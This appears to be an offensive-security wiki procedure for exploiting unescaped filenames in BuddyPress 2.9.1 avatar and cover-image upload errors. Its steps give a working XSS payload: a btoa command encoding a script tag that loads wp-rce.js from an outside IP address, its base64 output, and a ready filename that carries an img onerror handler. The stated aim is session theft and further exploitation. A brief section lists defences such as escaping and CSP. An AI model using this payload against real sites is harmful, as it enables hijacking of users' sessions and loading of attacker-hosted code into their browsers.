---
tags:
  - xss
  - file-upload
  - bypass
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/btoa-encode-xss-payload]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 19ad11d5-8043-4838-be00-d58c3a8d6d5b
created_at: '2025-12-14T03:46:37.620Z'
updated_at: '2025-12-14T03:46:37.620Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Upload-Oversized-File-with-XSS-Payload

## Summary

This procedure exploits the lack of filename sanitization in BuddyPress upload error messages by submitting an oversized file with an embedded XSS payload, triggering JavaScript execution upon size rejection.

## Description

In BuddyPress 2.9.1, upload interfaces for avatars and cover images output the filename directly in error messages without HTML escaping. By crafting a filename with a base64-encoded script tag loader wrapped in an img onerror handler, the payload executes when the upload fails due to exceeding size limits (e.g., >2MB). This enables arbitrary JS in the victim's browser context, potentially stealing sessions or chaining attacks.

## Requirements

1. Access to upload interface
2. Oversized test file (e.g., large PNG/JPG > upload limit)
3. Browser console for payload encoding
4. External server hosting wp-rce.js

## Defense

Defensive measures and detection strategies:

- Escape HTML in all error outputs (e.g., use esc_html() in PHP)
- Validate and sanitize filenames before display
- Implement Content Security Policy (CSP) to block inline scripts and external loads
- Monitor upload logs for oversized attempts with suspicious filenames

## Objectives

1. Trigger upload failure to display error message
2. Inject and execute XSS payload via filename
3. Load external script for further exploitation
4. Achieve session theft or same-origin access

## Instructions

### Step 1: Encode Payload

**Context**: Generate base64 for the script to bypass length/character restrictions in filenames.

**Command** ([[commands/btoa-encode-xss-payload]]):
```javascript
btoa('Running POC<script type="text/javascript" src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');
```

> Outputs: UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4=. Use this in the filename.

### Step 2: Craft and Upload File

**Context**: Create filename with onerror handler and upload oversized file.

No command required; rename file to: POC<img src=x onerror='document.write(atob("[BASE64_FROM_STEP_1]"))'>.jpg and submit via form.

> Upload fails, error shows filename, payload executes loading external JS.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/btoa-encode-xss-payload]]

## Tools Used


## Tags

- [[xss]]
- [[file-upload]]
